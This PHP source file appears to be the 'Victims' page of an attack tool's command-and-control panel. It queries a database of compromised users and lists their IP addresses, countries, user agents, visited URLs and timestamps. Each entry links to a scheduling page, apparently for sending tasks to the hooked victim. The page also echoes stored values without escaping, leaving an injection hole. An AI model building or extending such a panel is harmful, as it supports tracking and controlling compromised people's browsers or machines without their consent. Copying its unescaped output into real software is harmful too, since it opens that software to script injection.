<?php
include('login.php');
define('allowed',true);
include('../db.php');
include('header.php');
?>
    <div class="content">
        <p>
            <h1>Victims</h1>
        </p>
        <table>
            <tr>
                <th>User ID (<a href="#" ctitle="Identify a user in a site" class="tooltip">?</a>)</th>
                <th>IP Address</th>
                <th>Country</th>
                <th>User Agent</th>
                <th>URL</th>
                <th>Registration Date</th>
                <th>Last Update</th>
            </tr>
            <?php
            if ($res = $mysqli->query("SELECT * FROM users ORDER BY lastupdate DESC;")) {
                $res->data_seek(0);
                while ($row = $res->fetch_assoc()) {
                ?>
                <tr>
                    <td><a href="schedules.php?uid=<?php echo $row['id']; ?>"><?php echo $row['id']; ?></a></td>
                    <td><?php echo $row['ip']; ?></td>
                    <td><img width="25" height="15" src="<?php echo "http://api.hostip.info/flag.php?ip=".$row['ip']; ?>" /></td>
                    <td><?php echo $row['ua']; ?></td>
                    <td><?php echo $row['url']; ?></td>
                    <td><?php echo $row['regdate']; ?></td>
                    <td><?php echo $row['lastupdate']; ?></td>
                </td>
                <?php
                }
                $res->close();
            }
            ?>
        </table>
   </div>
</body>
</html>
<?php
$mysqli->close();
?>
